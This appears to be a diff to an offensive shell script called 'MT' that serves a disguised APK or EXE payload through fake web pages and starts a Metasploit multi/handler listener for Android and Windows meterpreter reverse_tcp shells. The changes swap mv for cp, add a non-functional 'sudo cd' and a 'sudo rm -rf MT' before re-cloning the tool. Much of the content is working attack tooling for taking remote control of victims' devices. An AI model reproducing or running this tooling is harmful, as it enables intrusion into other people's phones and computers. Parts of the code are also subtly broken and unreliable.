@@ -88,7 +88,7 @@ echo "
 ${GREEN}What's tha photo ?"
 read -p "
 ${RED}[${WHITE}-${RED}]${GREEN} Type locattion of image : ${BLUE}" emagi
-sudo mv $emagi html/Android/html/images/
+sudo cp $emagi html/Android/html/images/
 sudo mv * pic01.jpg
 elif [ $er = n ]
 then
@@ -123,7 +123,7 @@ echo "${GREEN}direct apk link --> ${RED}http://$z/MT.apk"
 sleep 1
 echo "${GREEN}THX to use ${RED}MT${GREEN} ^<^"
 sleep 2
-cd meterpreter
+sudo cd meterpreter
 echo "open msf wait..."
 msfconsole -x 'use multi/handler; set LHOST 0.0.0.0; set LPORT 4444; set PAYLOAD android/meterpreter/reverse_tcp; show options; run'
 elif [ $q = $a ];
@@ -173,7 +173,7 @@ echo "
 ${GREEN}What's tha photo ?"
 read -p "
 ${RED}[${WHITE}-${RED}]${GREEN} Type locattion of image : ${BLUE}" emagi
-sudo mv $emagi html/Windows/html/images
+sudo cp $emagi html/Windows/html/images
 sudo mv * pic01.jpg
 elif [ $re = n ]
 then
@@ -208,12 +208,13 @@ echo "${GREEN}direct apk link --> ${RED}http://$z/MT.exe"
 sleep 1
 echo "${GREEN}THX to use ${RED}MT${GREEN} ^<^"
 sleep 2
-cd meterpreter
+sudo cd meterpreter
 echo "open msf wait..."
 msfconsole -x 'use multi/handler; set LHOST 0.0.0.0; set LPORT 4444; set PAYLOAD windows/meterpreter/reverse_tcp; show options; run'
 elif [ $q = $v ];
 then
 cd ..
+sudo rm -rf MT
 git clone http://github.com/MazenTurk201/MT
 cd MT
 chmod +x MT.sh
